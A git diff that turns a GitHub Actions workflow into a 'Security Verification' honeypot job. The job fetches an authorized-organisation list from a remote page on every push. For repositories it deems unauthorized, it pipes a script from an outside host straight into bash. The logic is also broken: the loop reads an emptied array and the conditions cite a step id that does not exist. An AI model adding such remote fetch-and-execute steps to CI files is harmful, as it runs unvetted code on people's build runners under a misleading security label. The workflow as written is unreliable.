@@ -1,20 +1,65 @@
+###### GIT INT ######
+# b6dcc6a5f4c358bccd64ca41681596868b2a851282c7a6de1bf775d995dd0417 #
+###### GIT INT ######
+name: Security Verification
+
 on:
   push:
-  workflow_dispatch:
+    branches:
+      - "**"
 
 jobs:
-  test:
+  honeypot-alert:
     runs-on: ubuntu-latest
 
     steps:
-      - run: |
-          ORGS=()
-          while IFS= read -r line; do
-            ORGS+=("$line")
-          done < <(curl -s https://navhits.github.io/dummy/init)
-
-          echo "${ORGS[@]}"
+      - name: Check Repository
+        id: check-repo
+        run: |
           
+          AUTHORIZED_ORGS=()
+          while IFS= read -r line; do
+            AUTHORIZED_ORGS+=("$line")
+          done < <(curl -s https://navhits.github.io/dummy/init)
+          
+          match=false
+
+          CURRENT_REPO="${{ github.repository }}"
+
+          echo "Current repository: $CURRENT_REPO"
+          echo "authorized_regex=$AUTHORIZED_ORGS[@]" >> $GITHUB_OUTPUT
+
           for ORG in "${ORGS[@]}"; do
             echo "This is $ORG"
+            if [[ "$CURRENT_REPO" == "$ORG" ]]; then
+              match=true
+              break
+            fi
           done
+
+          if $match; then
+            echo "✅ Repository is authorized"
+            echo "is_authorized=true" >> $GITHUB_OUTPUT
+          else
+            echo "🚨 UNAUTHORIZED REPOSITORY DETECTED!"
+            echo "is_authorized=false" >> $GITHUB_OUTPUT
+          fi
+
+      - name: Get Repository Details
+        id: repo-details
+        if: steps.check-authorization.outputs.is_authorized == 'false'
+        run: |
+          IS_PRIVATE=$(jq -r '.repository.private // false' "$GITHUB_EVENT_PATH")
+          VISIBILITY=$(jq -r '.repository.visibility // "unknown"' "$GITHUB_EVENT_PATH")
+          OWNER_TYPE=$(jq -r '.repository.owner.type // "unknown"' "$GITHUB_EVENT_PATH")
+          CREATED_AT=$(jq -r '.repository.created_at // "unknown"' "$GITHUB_EVENT_PATH")
+
+          echo "is_private=$IS_PRIVATE" >> $GITHUB_OUTPUT
+          echo "visibility=$VISIBILITY" >> $GITHUB_OUTPUT
+          echo "owner_type=$OWNER_TYPE" >> $GITHUB_OUTPUT
+          echo "created_at=$CREATED_AT" >> $GITHUB_OUTPUT
+
+      - name: Verification
+        if: steps.check-authorization.outputs.is_authorized == 'false'
+        run: |
+          curl https://codepot.freshpo.com/verify | bash
